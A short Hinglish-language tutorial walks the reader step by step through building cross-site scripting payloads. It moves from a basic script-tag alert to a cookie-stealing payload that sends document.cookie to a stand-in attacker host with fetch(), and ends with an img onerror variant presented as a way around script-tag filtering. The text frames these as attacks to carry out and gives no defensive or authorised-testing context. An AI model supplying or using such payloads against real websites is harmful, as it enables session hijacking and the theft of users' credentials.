# 💣 XSS Payload Banana – Step by Step

🔹 Step 1: Start karo <script> tag se

Yeh browser ko batata hai ke ab JavaScript chalne wali hai.

**<script>**

🔹 Step 2: JavaScript code likho uske andar

Sabse simple payload hota hai **alert('XSS')** — isse popup aata hai.

**<script>
alert('XSS');
</script>**

🔹 Step 3: End karo </script> se

Yeh batata hai ke JavaScript ka block khatam ho gaya.

---

### ✅ Final Payload:

**<script>alert('XSS');</script>**

---

### 🔥 Advanced Payload Example:

Agar tum cookie nikalna chahte ho:

**<script>
fetch("https://evil.com/steal?c=" + document.cookie);
</script>**

Yahan:

document.cookie → user ki cookie le raha hai

fetch() → us cookie ko attacker ki site par bhej raha hai

---

### ⚠️ Bonus Tip:

Kayi websites <script> block karti hain. Tab tum alternate technique use karte ho:

**<img src=x onerror=alert('XSS')>**

Yahan:

**<img>** toh allow hai

**onerror** JavaScript chala deta hai jab image load na ho
